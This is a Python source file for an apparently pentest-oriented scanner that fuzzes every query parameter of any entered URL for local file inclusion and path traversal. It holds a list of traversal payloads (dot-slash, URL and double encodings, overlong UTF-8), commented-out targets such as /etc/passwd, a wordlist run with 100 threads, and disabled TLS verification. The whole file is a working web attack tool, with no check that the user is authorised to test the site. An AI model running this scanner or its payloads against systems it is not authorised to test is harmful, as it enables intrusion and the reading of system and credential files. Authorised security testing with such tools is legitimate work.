import random
import string
import threading
import urllib.parse
import concurrent.futures
from statistics import mean, stdev

import requests
from rich.console import Console
from rich.progress import Progress

from core.base import BaseChecker, wordlist_path


class LFIChecker(BaseChecker):
    def __init__(self, url, depth=10, silent=False):
        super().__init__(url, silent)
        self.depth = depth
        self.param_name = None
        self.LFI_TEST_FILES = [
            # ('/etc/passwd', re.compile(r'root:(.*):\d+:\d+:')),
            # ('/Windows/System32/drivers/etc/hosts', re.compile(r'127\.0\.0\.1\s+localhost'))
        ]
        self.LFI_PAYLOADS = [
            '../',  # Original
            '....//',  # Double dot slash
            '..///////..////..//////',  # Excessive slash
            '/%5C..',  # URL encoded backslash
            '/var/www/../../',  # Maintain initial path
            '....\\/',  # Double dot backslash (Windows)
            '%5c..%5c',  # URL encoded
            '%c0%af',  # Overlong UTF-8 Unicode encoding
            '..%252f',  # Double encoding
            '%252e%252e%252f'  # Double encoding with dot
        ]

    def path_traversal_checker(self):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = []

        for file_path, _ in self.LFI_TEST_FILES:
            for payload in self.LFI_PAYLOADS:
                file_paths.append((payload * 10 + file_path, _))
                file_paths.append((urllib.parse.quote(payload * 10 + file_path), _))

        wl_path = wordlist_path('big.txt')
        with open(wl_path, 'r') as f:
            for line in f:
                stripped_line = line.strip()
                if stripped_line:
                    file_paths.append((stripped_line, None))

        console = Console()
        total_operations = len(params.keys()) * len(file_paths)

        if not self.silent:
            with Progress(console=console) as progress:
                return self._scan(params, file_paths, parsed_url, console, total_operations, progress)

        return self._scan(params, file_paths, parsed_url, console)

    def _scan(self, params, file_paths, parsed_url, console, total_operations=None, progress=None):
        task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None
        response_lengths = []
        lock = threading.Lock()
        connection_error_count = 0
        shared_results = []
        stop_signal = False

        try:
            for param in params:
                random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                response = requests.get(self.url, params={param: random_string}, verify=False)
                response_lengths.append(len(response.content))
        except requests.exceptions.ConnectionError:
            console.print("[bold red]Request Failed (possible WAF block)...[/bold red]")
            return False, None

        def send_request(file_path, file_regex, param_name):
            nonlocal shared_results, connection_error_count, stop_signal

            if stop_signal:
                return

            new_params = params.copy()
            new_params[param_name] = file_path
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

            try:
                response = requests.get(fuzzed_url, verify=False)
                response_length = len(response.content)
                response_text = response.text

                with lock:
                    response_lengths.append(response_length)

                lfi_detected = False
                if file_regex and file_regex.search(response_text):
                    if not self.silent:
                        console.print(f"[bold green]Possible LFI detected at {fuzzed_url}\nResponse length: {response_length}\nStatus code: {response.status_code}[/bold green]", style='bold green')
                    lfi_detected = True
                    self.param_name = param_name

                # Update stats
                with lock:
                    avg = mean(response_lengths)
                    stddev = stdev(response_lengths) if len(response_lengths) > 1 else 0.0

                # Detect if response length is an outlier
                if stddev > 0 and abs(response_length - avg) > 2.5 * stddev and response.status_code < 400 and not response.history:
                    if not self.silent:
                        console.print(f"[bold yellow]{fuzzed_url}[/bold yellow] - Length: [yellow]{response_length}[/yellow], Status code: [yellow]{response.status_code}[/yellow]", style='bold green')
                    lfi_detected = True
                    self.param_name = param_name

                if lfi_detected:
                    shared_results.append((True, param_name))

            except requests.exceptions.ConnectionError:
                connection_error_count += 1
                if connection_error_count >= 10:
                    console.print("[bold red]Request Failed (possible WAF block)...[/bold red]")
                    shared_results.append((False, None))
                    stop_signal = True

            if progress:
                progress.update(task, advance=1)

        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = []
            for file_path, file_regex in file_paths:
                for param_name in params.keys():
                    futures.append(executor.submit(send_request, file_path, file_regex, param_name))

            for future in concurrent.futures.as_completed(futures):
                future.result()

        return any(result for result, _ in shared_results), self.param_name


def main():
    url = input('Enter site URL to test: ')
    checker = LFIChecker(url, silent=False)
    result, param_name = checker.path_traversal_checker()
    print(f"LFI detected: {result}")

if __name__ == "__main__":
    main()
